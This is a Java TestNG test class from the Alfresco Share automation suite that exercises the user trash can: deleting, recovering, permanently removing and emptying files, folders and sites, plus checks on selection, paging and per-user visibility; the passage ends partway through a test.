/*
 * Copyright (C) 2005-2013 Alfresco Software Limited.
 *
 * This file is part of Alfresco
 *
 * Alfresco is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Alfresco is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with Alfresco. If not, see <http://www.gnu.org/licenses/>.
 */
package org.alfresco.share.user.trashcan;

import java.util.List;

import org.alfresco.po.share.enums.UserRole;
import org.alfresco.po.share.exception.ShareException;
import org.alfresco.po.share.site.DestinationAndAssigneeBean;
import org.alfresco.po.share.site.document.DocumentDetailsPage;
import org.alfresco.po.share.site.document.DocumentLibraryPage;
import org.alfresco.po.share.site.document.FolderDetailsPage;
import org.alfresco.po.share.site.document.ManagePermissionsPage;
import org.alfresco.po.share.site.document.SyncInfoPage.ButtonType;
import org.alfresco.po.share.user.SelectActions;
import org.alfresco.po.share.user.TrashCanItem;
import org.alfresco.po.share.user.TrashCanPage;
import org.alfresco.po.share.user.TrashCanValues;
import org.alfresco.share.util.AbstractCloudSyncTest;
import org.alfresco.share.util.ShareUser;
import org.alfresco.share.util.ShareUserMembers;
import org.alfresco.share.util.ShareUserProfile;
import org.alfresco.share.util.ShareUserSitePage;
import org.alfresco.share.util.SiteUtil;
import org.alfresco.share.util.api.CreateUserAPI;
import org.alfresco.webdrone.testng.listener.FailedTestListener;
import org.apache.commons.lang3.StringUtils;
import org.testng.Assert;
import org.testng.annotations.BeforeClass;
import org.testng.annotations.Listeners;
import org.testng.annotations.Test;


/**
 * Class includes: Tests from TrashCan.
 * 
 * @author nshah
 */
@Listeners(FailedTestListener.class)
public class TrashCanTest extends AbstractCloudSyncTest
{

    protected String testUser;
    private String testDomainFree = DOMAIN_FREE;
    private String adminUserFree = ADMIN_USERNAME;
    private String testDomain = DOMAIN_HYBRID;
    private String format = "EEE d MMM YYYY";
    
    private String getCustomRoleName(String siteName, UserRole role)
    {
        return String.format("site_%s_%s",ShareUser.getSiteShortname(siteName), StringUtils.replace(role.getRoleName().trim(), " ", ""));
    }
    
    /**
     * Class includes: Tests from TestLink in Area: Advanced Search Tests
     * <ul>
     * <li>Test searches using various Properties, content, Folder</li>
     * </ul>
     */
    @Override
    @BeforeClass(alwaysRun=true)
    public void setup() throws Exception
    {
        super.setup();
        testDomain = DOMAIN_HYBRID;
        testDomainFree = DOMAIN_FREE;
        adminUserFree = ADMIN_USERNAME;
        testName = this.getClass().getSimpleName();
    }

  @Test(groups = { "DataPrepTrashCan" }) 
    public void dataPrep_TrashCan_ALF_10449() throws Exception
    {
        String testName = getTestName();

        String trashcanUser = getUserNameForDomain(testName, testDomainFree);
        String siteName = getSiteName(testName);

        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { trashcanUser });

        ShareUser.login(drone, trashcanUser, DEFAULT_PASSWORD);

        SiteUtil.createSite(drone, siteName, siteName, SITE_VISIBILITY_PUBLIC, true);

        ShareUser.logout(drone);
    }

    @Test(groups = { "TrashCan" })
    public void ALF_10449() throws Exception
    {
        String testName = getTestName();
        String trashcanUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);

        String fileName1 = getFileName(testName) + "-1" + System.currentTimeMillis();
        String fileName2 = getFileName(testName) + "-2" + System.currentTimeMillis();
        String folderName1 = getFolderName(testName) + "-3" + System.currentTimeMillis();
        String folderName2 = getFolderName(testName) + "-4" + System.currentTimeMillis();

        ShareUser.login(drone, trashcanUser, DEFAULT_PASSWORD);

        ShareUser.openSitesDocumentLibrary(drone, siteName);

        ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });

        ShareUser.uploadFileInFolder(drone, new String[] { fileName2, DOCLIB });

        ShareUserSitePage.createFolder(drone, folderName1, folderName1);

        ShareUserSitePage.createFolder(drone, folderName2, folderName2);

        ShareUser.selectContentCheckBox(drone, fileName1);
        ShareUser.selectContentCheckBox(drone, fileName2);
        ShareUser.selectContentCheckBox(drone, folderName1);
        ShareUser.selectContentCheckBox(drone, folderName2);

        DocumentLibraryPage docLibPage = ShareUser.deleteSelectedContent(drone);

        Assert.assertFalse(docLibPage.isFileVisible(fileName1), fileName1 + "is deleted");
        Assert.assertFalse(docLibPage.isFileVisible(fileName2), fileName2 + "is deleted");
        Assert.assertFalse(docLibPage.isFileVisible(folderName1), folderName1 + "is deleted");
        Assert.assertFalse(docLibPage.isFileVisible(folderName2), folderName2 + "is deleted");

        ShareUserProfile.navigateToTrashCan(drone);

        Assert.assertTrue(ShareUserProfile.getTrashCanItems(drone, fileName1).contains(fileName1));
        Assert.assertTrue(ShareUserProfile.getTrashCanItems(drone, fileName2).contains(fileName2));
        Assert.assertTrue(ShareUserProfile.getTrashCanItems(drone, folderName1).contains(folderName1));
        Assert.assertTrue(ShareUserProfile.getTrashCanItems(drone, folderName2).contains(folderName2));

    }

  @Test(groups = { "DataPrepTrashCan" }) 
    public void dataPrep_TrashCan_ALF_10457() throws Exception
    {
        String testName = getTestName();
        String testUser = getUserNameForDomain(testName, testDomainFree);
        String siteName = getSiteName(testName);
        String fileName = getFileName(testName) + System.currentTimeMillis();
        String folderName = getFolderName(testName) + System.currentTimeMillis();

        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { testUser });

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        SiteUtil.createSite(drone, siteName, siteName, SITE_VISIBILITY_PUBLIC, true);

        ShareUser.openSitesDocumentLibrary(drone, siteName);

        for (int i = 0; i < 4; i++)
        {
            ShareUser.uploadFileInFolder(drone, new String[] { i + "-" + fileName, DOCLIB }).render();
            ShareUserSitePage.createFolder(drone, i + "-" + folderName, i + "-" + folderName);
        }
        for (int i = 0; i < 3; i++)
        {
            ShareUser.createCopyOfAllContent(drone);
        }

        ShareUser.deleteAllContentFromDocumentLibrary(drone);

        ShareUser.logout(drone);
    }

    @Test(groups = { "TrashCan" })
    public void ALF_10457() throws Exception
    {
        String testName = getTestName();
        String trashcanUser = getUserNameForDomain(testName, testDomainFree);

        ShareUser.login(drone, trashcanUser, DEFAULT_PASSWORD);

        TrashCanPage trashCanPage = ShareUserProfile.navigateToTrashCan(drone);

        // TODO: Naved: Missing Step 3: Click on Page 2

        // TODO: Naved: Missing Step 4: Click on Page 1

        Assert.assertTrue(trashCanPage.hasNextPage());

        trashCanPage.selectNextPage();

        Assert.assertTrue(trashCanPage.render().hasPreviousPage());

        trashCanPage.render().selectPreviousPage();

        ShareUser.logout(drone);

    }

  @Test(groups = { "DataPrepTrashCan" }) 
    public void dataPrep_TrashCan_ALF_10450() throws Exception
    {

        String testName = getTestName();
        String trashcanUser = getUserNameForDomain(testName, testDomainFree);
        String siteName = getSiteName(testName);

        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { trashcanUser });

        ShareUser.login(drone, trashcanUser, DEFAULT_PASSWORD);

        SiteUtil.createSite(drone, siteName, siteName, SITE_VISIBILITY_PUBLIC, true);

        ShareUser.logout(drone);
    }

    @Test(groups = { "TrashCan" })
    public void ALF_10450() throws Exception
    {
        String testName = getTestName();
        String trashcanUser = getUserNameForDomain(testName, testDomainFree);
        String siteName = getSiteName(testName);

        String fileName1 = getFileName(testName) + "-1" + System.currentTimeMillis();
        String fileName2 = getFileName(testName) + "-2" + System.currentTimeMillis();

        String folderName1 = getFolderName(testName) + "-1" + System.currentTimeMillis();
        String folderName2 = getFolderName(testName) + "-2" + System.currentTimeMillis();

        ShareUser.login(drone, trashcanUser, DEFAULT_PASSWORD);

        ShareUser.openSitesDocumentLibrary(drone, siteName);

        ShareUserSitePage.createFolder(drone, folderName1, folderName1);
        ShareUserSitePage.createFolder(drone, folderName2, folderName2);

        ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });
        ShareUser.uploadFileInFolder(drone, new String[] { fileName2, DOCLIB });

        ShareUser.selectContentCheckBox(drone, folderName1);
        ShareUser.selectContentCheckBox(drone, folderName2);
        ShareUser.selectContentCheckBox(drone, fileName1);
        ShareUser.selectContentCheckBox(drone, fileName2);

        ShareUser.deleteSelectedContent(drone);
        String dateOfContentDeletion = ShareUser.getDate(format);

        ShareUserProfile.navigateToTrashCan(drone);

        TrashCanItem itemInfo = ShareUserProfile.getTrashCanItem(drone, folderName1);

        Assert.assertEquals(itemInfo.getFileName(), folderName1);
        Assert.assertTrue(itemInfo.getDate().contains(dateOfContentDeletion), String.format("Date displayed: %s, Date Expected: %s",itemInfo.getDate(),dateOfContentDeletion));
        Assert.assertTrue(itemInfo.getFolderPath().endsWith(DOCLIB_CONTAINER));
        Assert.assertTrue(itemInfo.getUserFullName().startsWith(trashcanUser));

        itemInfo = ShareUserProfile.getTrashCanItem(drone, folderName2);

        Assert.assertEquals(itemInfo.getFileName(), folderName2);
        Assert.assertTrue(itemInfo.getDate().contains(dateOfContentDeletion));
        Assert.assertTrue(itemInfo.getFolderPath().endsWith(DOCLIB_CONTAINER));
        Assert.assertTrue(itemInfo.getUserFullName().startsWith(trashcanUser));

        itemInfo = ShareUserProfile.getTrashCanItem(drone, fileName1);

        Assert.assertEquals(itemInfo.getFileName(), fileName1);
        Assert.assertTrue(itemInfo.getDate().contains(dateOfContentDeletion));
        Assert.assertTrue(itemInfo.getFolderPath().endsWith(DOCLIB_CONTAINER));
        Assert.assertTrue(itemInfo.getUserFullName().startsWith(trashcanUser));

        itemInfo = ShareUserProfile.getTrashCanItem(drone, fileName2);

        Assert.assertEquals(itemInfo.getFileName(), fileName2);
        Assert.assertTrue(itemInfo.getDate().contains(dateOfContentDeletion));
        Assert.assertTrue(itemInfo.getFolderPath().endsWith(DOCLIB_CONTAINER));
        Assert.assertTrue(itemInfo.getUserFullName().startsWith(trashcanUser));
    }

  @Test(groups = { "DataPrepTrashCan" }) 
    public void dataPrep_TrashCan_ALF_10458() throws Exception
    {
        String testName = getTestName();
        String trashcanUser = getUserNameForDomain(testName, testDomainFree);
        String siteName = getSiteName(testName);

        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { trashcanUser });

        ShareUser.login(drone, trashcanUser, DEFAULT_PASSWORD);

        SiteUtil.createSite(drone, siteName, siteName, SITE_VISIBILITY_PUBLIC, true);

        ShareUser.logout(drone);
    }

    /**
     * ALF_10458
     */
    @Test(groups = { "TrashCan" })
    public void ALF_10458() throws Exception
    {
        String testName = getTestName();

        String testUser = getUserNameForDomain(testName, testDomainFree);

        String siteName = getSiteName(testName);
        String siteName1 = getSiteName(testName) + "-1" + System.currentTimeMillis();
        String siteName2 = getSiteName(testName) + "-2" + System.currentTimeMillis();

        String fileName1 = getFileName(testName) + "-1" + System.currentTimeMillis();
        String fileName2 = getFileName(testName) + "-2" + System.currentTimeMillis();

        String folderName1 = getFolderName(testName) + "-3" + System.currentTimeMillis();
        String folderName2 = getFolderName(testName) + "-4" + System.currentTimeMillis();

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        // Create Sites
        SiteUtil.createSite(drone, siteName1, siteName1, SITE_VISIBILITY_PUBLIC, true);
        SiteUtil.createSite(drone, siteName2, siteName2, SITE_VISIBILITY_PUBLIC, true);

        // Delete Sites
        SiteUtil.deleteSite(drone, siteName1);
        SiteUtil.deleteSite(drone, siteName2);

        ShareUser.openSitesDocumentLibrary(drone, siteName);

        ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });
        ShareUser.uploadFileInFolder(drone, new String[] { fileName2, DOCLIB });

        ShareUserSitePage.createFolder(drone, folderName1, folderName1);
        ShareUserSitePage.createFolder(drone, folderName2, folderName2);

        // Select Files and Folders created above
        ShareUser.selectContentCheckBox(drone, fileName1);
        ShareUser.selectContentCheckBox(drone, fileName2);

        ShareUser.selectContentCheckBox(drone, folderName1);
        DocumentLibraryPage docLibPage = ShareUser.selectContentCheckBox(drone, folderName2);

        ShareUser.deleteSelectedContent(drone);

        ShareUserProfile.navigateToTrashCan(drone);

        // Recover site, file and folder
        ShareUserProfile.recoverTrashCanItem(drone, siteName1.toLowerCase());

        ShareUserProfile.recoverTrashCanItem(drone, fileName1);

        ShareUserProfile.recoverTrashCanItem(drone, folderName1);

        Assert.assertTrue(ShareUser.openSiteDashboard(drone, siteName1).isSite(siteName1));

        // Confirm right files are recovered
        docLibPage = ShareUser.openSitesDocumentLibrary(drone, siteName);
        Assert.assertTrue(docLibPage.isFileVisible(fileName1));
        Assert.assertFalse(docLibPage.isFileVisible(fileName2));

        // Confirm right folders are recovered
        Assert.assertTrue(docLibPage.isFileVisible(folderName1));
        Assert.assertFalse(docLibPage.isFileVisible(folderName2));

        // Confirm certain files and right folders are still in trashcan as expected
        ShareUserProfile.navigateToTrashCan(drone);

        // Additional Step to check that the items not recovered are present in trashcan
        TrashCanItem trashCanItem = ShareUserProfile.getTrashCanItem(drone, siteName2);
        Assert.assertNotNull(trashCanItem);

        trashCanItem = ShareUserProfile.getTrashCanItem(drone, fileName2);
        Assert.assertNotNull(trashCanItem);

        trashCanItem = ShareUserProfile.getTrashCanItem(drone, folderName2);
        Assert.assertNotNull(trashCanItem);
    }

  @Test(groups = { "DataPrepTrashCan" }) 
    public void dataPrep_TrashCan_ALF_10459() throws Exception
    {
        String testName = getTestName();
        String trashcanUser = getUserNameForDomain(testName, testDomainFree);
        String siteName = getSiteName(testName);

        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { trashcanUser });

        ShareUser.login(drone, trashcanUser, DEFAULT_PASSWORD);

        SiteUtil.createSite(drone, siteName, siteName, SITE_VISIBILITY_PUBLIC, true);

        ShareUser.logout(drone);
    }

    /**
     * ALF_10459
     */
    @Test(groups = { "TrashCan" })
    public void ALF_10459() throws Exception
    {
        // dataPrep_TrashCan_ALF_10459(drone);
        String testName = getTestName();

        String testUser = getUserNameForDomain(testName, testDomainFree);

        String siteName = getSiteName(testName);
        String siteName1 = getSiteName(testName) +System.currentTimeMillis() +"-1";
        String siteName2 = getSiteName(testName) +System.currentTimeMillis() +"-2";

        String fileName1 = getFileName(testName) + "-1" + System.currentTimeMillis();
        String fileName2 = getFileName(testName) + "-2" + System.currentTimeMillis();
        String fileName3 = getFileName(testName) + "-5" + System.currentTimeMillis();

        String folderName1 = getFolderName(testName) + "-3" + System.currentTimeMillis();
        String folderName2 = getFolderName(testName) + "-4" + System.currentTimeMillis();
        String folderName3 = getFolderName(testName) + "-6" + System.currentTimeMillis();

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        ShareUser.createSite(drone, siteName1, SITE_VISIBILITY_PUBLIC);
        ShareUser.createSite(drone, siteName2, SITE_VISIBILITY_PUBLIC);

        ShareUser.openSitesDocumentLibrary(drone, siteName);

        ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });
        ShareUser.uploadFileInFolder(drone, new String[] { fileName2, DOCLIB });
        ShareUser.uploadFileInFolder(drone, new String[] { fileName3, DOCLIB });

        ShareUserSitePage.createFolder(drone, folderName1, folderName1);
        ShareUserSitePage.createFolder(drone, folderName2, folderName2);

        DocumentLibraryPage docLibPage = ShareUserSitePage.createFolder(drone, folderName3, folderName3);

        // Select Content
        ShareUser.selectContentCheckBox(drone, fileName1);
        ShareUser.selectContentCheckBox(drone, fileName2);
        ShareUser.selectContentCheckBox(drone, fileName3);
        ShareUser.selectContentCheckBox(drone, folderName1);
        ShareUser.selectContentCheckBox(drone, folderName2);
        ShareUser.selectContentCheckBox(drone, folderName3);

        ShareUser.deleteSelectedContent(drone);
        SiteUtil.deleteSite(drone, siteName1);
        SiteUtil.deleteSite(drone, siteName2);

        ShareUserProfile.navigateToTrashCan(drone);

        ShareUserProfile.deleteTrashCanItem(drone, fileName1);

        ShareUserProfile.deleteTrashCanItem(drone, fileName2);

        ShareUserProfile.deleteTrashCanItem(drone, folderName1);

        ShareUserProfile.deleteTrashCanItem(drone, folderName2);

        ShareUserProfile.deleteTrashCanItem(drone, siteName1);

        ShareUserProfile.deleteTrashCanItem(drone, siteName2);

        Assert.assertFalse(SiteUtil.getSiteFinder(drone).getSiteList().contains(ShareUser.getSiteShortname(siteName1)));
        Assert.assertFalse(SiteUtil.getSiteFinder(drone).getSiteList().contains(ShareUser.getSiteShortname(siteName2)));

        docLibPage = ShareUser.openSitesDocumentLibrary(drone, siteName);
        Assert.assertFalse(docLibPage.isFileVisible(fileName1));
        Assert.assertFalse(docLibPage.isFileVisible(fileName2));

        Assert.assertFalse(docLibPage.isFileVisible(fileName3));

        Assert.assertFalse(docLibPage.isFileVisible(folderName1));
        Assert.assertFalse(docLibPage.isFileVisible(folderName2));

        Assert.assertFalse(docLibPage.isFileVisible(folderName3));

        ShareUserProfile.navigateToTrashCan(drone);

        TrashCanItem trashCanItem = ShareUserProfile.getTrashCanItem(drone, fileName3);
        Assert.assertTrue(trashCanItem.getFileName().contains(fileName3));

        trashCanItem = ShareUserProfile.getTrashCanItem(drone, folderName3);
        Assert.assertTrue(trashCanItem.getFileName().contains(folderName3));

    }

  @Test(groups = { "DataPrepTrashCan" }) 
    public void dataPrep_TrashCan_ALF_15261() throws Exception
    {
        String testName = getTestName();
        String trashcanUser = getUserNameForDomain(testName, testDomainFree);
        String siteName = getSiteName(testName);

        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { trashcanUser });

        ShareUser.login(drone, trashcanUser, DEFAULT_PASSWORD);

        SiteUtil.createSite(drone, siteName, siteName, SITE_VISIBILITY_PUBLIC, true);

        ShareUser.logout(drone);
    }

    @Test(groups = { "TrashCan" })
    public void ALF_15261() throws Exception
    {
        // dataPrep_TrashCan_ALF_15261(drone);
        String testName = getTestName();
        String testUser = getUserNameForDomain(testName, testDomainFree);

        String siteName = getSiteName(testName);

        String fileName1 = getFileName(testName) + "-1" + System.currentTimeMillis();
        String fileName2 = getFileName(testName) + "-2" + System.currentTimeMillis();

        String folderName1 = getFolderName(testName) + "-3" + System.currentTimeMillis();
        String folderName2 = getFolderName(testName) + "-4" + System.currentTimeMillis();

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        ShareUser.openSitesDocumentLibrary(drone, siteName);

        ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });
        ShareUser.uploadFileInFolder(drone, new String[] { fileName2, DOCLIB });

        ShareUserSitePage.createFolder(drone, folderName1, folderName1);
        ShareUserSitePage.createFolder(drone, folderName2, folderName2);

        // Select Content to delete

        ShareUser.selectContentCheckBox(drone, fileName1);
        ShareUser.selectContentCheckBox(drone, fileName2);
        ShareUser.selectContentCheckBox(drone, folderName1);
        ShareUser.selectContentCheckBox(drone, folderName2);

        ShareUser.deleteSelectedContent(drone);

        TrashCanPage trashCan = ShareUserProfile.navigateToTrashCan(drone).render();
        trashCan = (TrashCanPage) trashCan.selectAction(SelectActions.ALL).render();

        // Select All.
        Assert.assertTrue(ShareUserProfile.getTrashCanItem(drone, fileName1).isCheckBoxSelected());
        Assert.assertTrue(ShareUserProfile.getTrashCanItem(drone, fileName2).isCheckBoxSelected());
        Assert.assertTrue(ShareUserProfile.getTrashCanItem(drone, folderName1).isCheckBoxSelected());
        Assert.assertTrue(ShareUserProfile.getTrashCanItem(drone, folderName2).isCheckBoxSelected());

        // Invert the selection.
        trashCan = (TrashCanPage) trashCan.selectAction(SelectActions.INVERT).render();
        Assert.assertFalse(ShareUserProfile.getTrashCanItem(drone, fileName1).isCheckBoxSelected());
        Assert.assertFalse(ShareUserProfile.getTrashCanItem(drone, fileName2).isCheckBoxSelected());
        Assert.assertFalse(ShareUserProfile.getTrashCanItem(drone, folderName1).isCheckBoxSelected());
        Assert.assertFalse(ShareUserProfile.getTrashCanItem(drone, folderName2).isCheckBoxSelected());

        // Select none
        trashCan = (TrashCanPage) trashCan.selectAction(SelectActions.NONE).render();
        Assert.assertFalse(ShareUserProfile.getTrashCanItem(drone, fileName1).isCheckBoxSelected());
        Assert.assertFalse(ShareUserProfile.getTrashCanItem(drone, fileName2).isCheckBoxSelected());
        Assert.assertFalse(ShareUserProfile.getTrashCanItem(drone, folderName1).isCheckBoxSelected());
        Assert.assertFalse(ShareUserProfile.getTrashCanItem(drone, folderName2).isCheckBoxSelected());

    }

  @Test(groups = { "DataPrepTrashCan" }) 
    public void dataPrep_TrashCan_ALF_15262() throws Exception
    {

        String testName = getTestName();
        String trashcanUser = getUserNameForDomain(testName, testDomainFree);
        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { trashcanUser });
    }

    @Test(groups = { "TrashCan" })
    public void ALF_15262() throws Exception
    {
        // dataPrep_TrashCan_ALF_15262(drone);
        String testName = getTestName();
        String trashcanUser = getUserNameForDomain(testName, testDomainFree);

        String siteName1 = getSiteName(testName) + "-1" + System.currentTimeMillis();
        String siteName2 = getSiteName(testName) + "-2" + System.currentTimeMillis();

        String fileName1 = getFileName(testName) + "-3" + System.currentTimeMillis();
        String fileName2 = getFileName(testName) + "-4" + System.currentTimeMillis();

        String folderName1 = getFolderName(testName) + "-5" + System.currentTimeMillis();
        String folderName2 = getFolderName(testName) + "-6" + System.currentTimeMillis();

        ShareUser.login(drone, trashcanUser, DEFAULT_PASSWORD);

        ShareUser.createSite(drone, siteName1, SITE_VISIBILITY_PUBLIC);
        ShareUser.createSite(drone, siteName2, SITE_VISIBILITY_PUBLIC);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });
        ShareUser.uploadFileInFolder(drone, new String[] { fileName2, DOCLIB });

        ShareUserSitePage.createFolder(drone, folderName1, folderName1);
        ShareUserSitePage.createFolder(drone, folderName2, folderName2);

        // Select content to be deleted

        ShareUser.selectContentCheckBox(drone, fileName1);
        ShareUser.selectContentCheckBox(drone, fileName2);
        ShareUser.selectContentCheckBox(drone, folderName1);
        DocumentLibraryPage docLibPage = ShareUser.selectContentCheckBox(drone, folderName2);

        ShareUser.deleteSelectedContent(drone);

        SiteUtil.deleteSite(drone, siteName1);
        SiteUtil.deleteSite(drone, siteName2);

        ShareUserProfile.navigateToTrashCan(drone);

        ShareUserProfile.recoverTrashCanItem(drone, siteName1);
        ShareUserProfile.recoverTrashCanItem(drone, fileName1);
        ShareUserProfile.recoverTrashCanItem(drone, folderName1);

        docLibPage = ShareUser.openSitesDocumentLibrary(drone, siteName1);

        Assert.assertTrue(docLibPage.isFileVisible(fileName1));
        Assert.assertTrue(docLibPage.isFileVisible(folderName1));

        Assert.assertFalse(docLibPage.isFileVisible(fileName2));
        Assert.assertFalse(docLibPage.isFileVisible(folderName2));

        ShareUserProfile.navigateToTrashCan(drone);

        Assert.assertTrue(ShareUserProfile.getTrashCanItems(drone, fileName2).contains(fileName2));
        Assert.assertTrue(ShareUserProfile.getTrashCanItems(drone, folderName2).contains(folderName2));
        Assert.assertTrue(ShareUserProfile.getTrashCanItems(drone, siteName2).contains(siteName2.toLowerCase()));

    }

  @Test(groups = { "DataPrepTrashCan" }) 
    public void dataPrep_TrashCan_ALF_15263() throws Exception
    {

        String testName = getTestName();
        String trashcanUser = getUserNameForDomain(testName, testDomainFree);
        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { trashcanUser });

    }

    @Test(groups = { "TrashCan" })
    public void ALF_15263() throws Exception
    {
        String testName = getTestName();
        String trashcanUser = getUserNameForDomain(testName, testDomainFree);

        String siteName1 = getSiteName(testName) + "-1" + System.currentTimeMillis();
        String siteName2 = getSiteName(testName) + "-2" + System.currentTimeMillis();

        String fileName1 = getFileName(testName) + "-3" + System.currentTimeMillis();
        String fileName2 = getFileName(testName) + "-4" + System.currentTimeMillis();

        String folderName1 = getFolderName(testName) + "-5" + System.currentTimeMillis();
        String folderName2 = getFolderName(testName) + "-6" + System.currentTimeMillis();

        ShareUser.login(drone, trashcanUser, DEFAULT_PASSWORD);

        ShareUser.createSite(drone, siteName1, SITE_VISIBILITY_PUBLIC);
        ShareUser.createSite(drone, siteName2, SITE_VISIBILITY_PUBLIC);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });
        ShareUser.uploadFileInFolder(drone, new String[] { fileName2, DOCLIB });

        ShareUserSitePage.createFolder(drone, folderName1, folderName1);
        ShareUserSitePage.createFolder(drone, folderName2, folderName2);

        // Select Content to be deleted

        ShareUser.selectContentCheckBox(drone, fileName1);
        ShareUser.selectContentCheckBox(drone, fileName2);
        ShareUser.selectContentCheckBox(drone, folderName1);
        ShareUser.selectContentCheckBox(drone, folderName2);

        ShareUser.deleteSelectedContent(drone);

        SiteUtil.deleteSite(drone, siteName1);
        SiteUtil.deleteSite(drone, siteName2);

        ShareUserProfile.navigateToTrashCan(drone);

        ShareUserProfile.deleteTrashCanItem(drone, siteName1);

        ShareUserProfile.deleteTrashCanItem(drone, fileName1);

        ShareUserProfile.deleteTrashCanItem(drone, folderName1);

        Assert.assertFalse(ShareUserProfile.isTrashCanItemPresent(drone, fileName1));

        Assert.assertTrue(ShareUserProfile.isTrashCanItemPresent(drone, siteName2));
        Assert.assertTrue(ShareUserProfile.isTrashCanItemPresent(drone, folderName2));
        Assert.assertTrue(ShareUserProfile.isTrashCanItemPresent(drone, fileName2));

    }

  @Test(groups = { "DataPrepTrashCan" }) 
    public void dataPrep_TrashCan_ALF_10460() throws Exception
    {

        String testName = getTestName();
        String trashcanUser = getUserNameForDomain(testName, testDomainFree);
        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { trashcanUser });

    }

    @Test(groups = { "TrashCan" })
    public void ALF_10460() throws Exception
    {
        // dataPrep_TrashCan_ALF_10460(drone);
        String testName = getTestName();
        String trashcanUser = getUserNameForDomain(testName, testDomainFree);

        String siteName1 = getSiteName(testName) + "-1" + System.currentTimeMillis();
        String siteName2 = getSiteName(testName) + "-2" + System.currentTimeMillis();

        String fileName1 = getFileName(testName) + "-3" + System.currentTimeMillis();
        String fileName2 = getFileName(testName) + "-4" + System.currentTimeMillis();

        String folderName1 = getFolderName(testName) + "-5" + System.currentTimeMillis();
        String folderName2 = getFolderName(testName) + "-6" + System.currentTimeMillis();

        ShareUser.login(drone, trashcanUser, DEFAULT_PASSWORD);

        ShareUser.createSite(drone, siteName1, SITE_VISIBILITY_PUBLIC);
        ShareUser.createSite(drone, siteName2, SITE_VISIBILITY_PUBLIC);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });
        ShareUser.uploadFileInFolder(drone, new String[] { fileName2, DOCLIB });

        ShareUserSitePage.createFolder(drone, folderName1, folderName1);
        ShareUserSitePage.createFolder(drone, folderName2, folderName2);

        // Select Files
        ShareUser.selectContentCheckBox(drone, fileName1);
        ShareUser.selectContentCheckBox(drone, fileName2);

        ShareUser.selectContentCheckBox(drone, folderName1);
        ShareUser.selectContentCheckBox(drone, folderName2);

        ShareUser.deleteSelectedContent(drone);

        SiteUtil.deleteSite(drone, siteName1);
        SiteUtil.deleteSite(drone, siteName2);

        TrashCanPage trashCanPage = ShareUserProfile.navigateToTrashCan(drone);

        ShareUserProfile.emptyTrashCan(drone, ButtonType.CANCEL);

        Assert.assertTrue(ShareUserProfile.isTrashCanItemPresent(drone, siteName1));
        Assert.assertTrue(ShareUserProfile.isTrashCanItemPresent(drone, folderName1));
        Assert.assertTrue(ShareUserProfile.isTrashCanItemPresent(drone, fileName1));

        ShareUserProfile.emptyTrashCan(drone, ButtonType.REMOVE);

        Assert.assertFalse(trashCanPage.hasTrashCanItems());

    }

  @Test(groups = { "DataPrepTrashCan" }) 
    public void dataPrep_TrashCan_ALF_10461() throws Exception
    {
        String testName = getTestName();
        String siteName1 = getSiteName(testName) + "-s1";

        String trashcanUser1 = getUserNameForDomain(testName + "1", testDomainFree);
        String trashcanUser2 = getUserNameForDomain(testName + "2", testDomainFree);

        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { trashcanUser1 });
        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { trashcanUser2 });

        ShareUser.login(drone, trashcanUser1, DEFAULT_PASSWORD);
        ShareUser.createSite(drone, siteName1, SITE_VISIBILITY_PUBLIC);
        ShareUser.logout(drone);

    }

    @Test(groups = { "TrashCan" })
    public void ALF_10461() throws Exception
    {
        // dataPrep_TrashCan_ALF_10461(drone);
        String testName = getTestName();
        String trashcanUser1 = getUserNameForDomain(testName + "1", testDomainFree);
        String trashcanUser2 = getUserNameForDomain(testName + "2", testDomainFree);

        String siteName1 = getSiteName(testName) + "-s1";

        String fileName1 = getFileName(testName) + "-fi1" + System.currentTimeMillis();

        String folderName1 = getFolderName(testName) + "-fo2" + System.currentTimeMillis();

        ShareUser.login(drone, trashcanUser1, DEFAULT_PASSWORD);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });

        ShareUserSitePage.createFolder(drone, folderName1, folderName1);

        // Select File and Folder
        ShareUser.selectContentCheckBox(drone, fileName1);
        ShareUser.selectContentCheckBox(drone, folderName1);

        ShareUser.deleteSelectedContent(drone);

        SiteUtil.deleteSite(drone, siteName1);

        ShareUser.logout(drone);

        ShareUser.login(drone, trashcanUser2, DEFAULT_PASSWORD);

        TrashCanPage trashCanPage = ShareUserProfile.navigateToTrashCan(drone);

        Assert.assertFalse(trashCanPage.hasTrashCanItems());

        Assert.assertFalse(ShareUserProfile.getTrashCanItems(drone, siteName1).contains(siteName1));

        Assert.assertFalse(ShareUserProfile.isTrashCanItemPresent(drone, fileName1));

